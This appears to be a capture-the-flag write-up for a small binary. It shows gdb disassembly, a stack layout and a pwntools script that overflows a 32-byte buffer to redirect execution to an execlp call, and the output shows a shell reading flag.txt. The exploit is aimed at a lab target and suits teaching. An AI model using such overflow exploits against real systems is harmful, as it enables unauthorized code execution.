gdb java

(gdb) disas bash
Dump of assembler code for function bash:
   0x0000000000400770 <+0>:	push   %rbp
   0x0000000000400771 <+1>:	mov    %rsp,%rbp
   0x0000000000400774 <+4>:	lea    0x26d(%rip),%rdi        # 0x4009e8
   0x000000000040077b <+11>:	call   0x4005d0 <puts@plt>
   0x0000000000400780 <+16>:	mov    $0x3,%edi
   0x0000000000400785 <+21>:	call   0x400620 <sleep@plt>
   0x000000000040078a <+26>:	lea    0x26f(%rip),%rdi        # 0x400a00
   0x0000000000400791 <+33>:	call   0x4005d0 <puts@plt>
   0x0000000000400796 <+38>:	call   0x400630 <rand@plt>
   0x000000000040079b <+43>:	cmp    $0x5029b,%eax
   0x00000000004007a0 <+48>:	jne    0x4007c1 <bash+81>
   0x00000000004007a2 <+50>:	mov    $0x0,%edx
   0x00000000004007a7 <+55>:	lea    0x232(%rip),%rsi        # 0x4009e0
   0x00000000004007ae <+62>:	lea    0x22b(%rip),%rdi        # 0x4009e0
   0x00000000004007b5 <+69>:	mov    $0x0,%eax
   0x00000000004007ba <+74>:	call   0x400610 <execlp@plt>
   0x00000000004007bf <+79>:	jmp    0x4007c2 <bash+82>
--Type <RET> for more, q to quit, c to continue without paging--c
   0x00000000004007c1 <+81>:	nop
   0x00000000004007c2 <+82>:	pop    %rbp
   0x00000000004007c3 <+83>:	ret
End of assembler dump.


I need to jump over the JNE and land here:
  0x00000000004007a2 <+50>:	mov    $0x0,%edx         //target



The stack:

Return Address (8 bytes)
Base Address (8 bytes)
	user.call (8 bytes)
user_favourite_lang (32 bytes)   //UserInput



Here the py script

from pwn import*

targetAddress = p64(0x4007a2)                         //target
Buffer = b'java' + b'A'*28                  //used b'string' (first inetraction -> A of garbage)
msgIN = Buffer + targetAddress                              //compact into an one input  

p = process('./java')              //opens the elf 
p.sendline(msgIN)              //Sends our message

p.interactive()       //Opens an bash during runtime and keeps it open













python3 payload.py 
[+] Starting local process './java': pid 11221
[*] Switching to interactive mode
Enter your favourite programming language: Just another Java noob...
$ ls
description.txt  flag.txt  java  java.c  payload.py
$ cat flag.txt
flag{this_is_a_flag}
$  



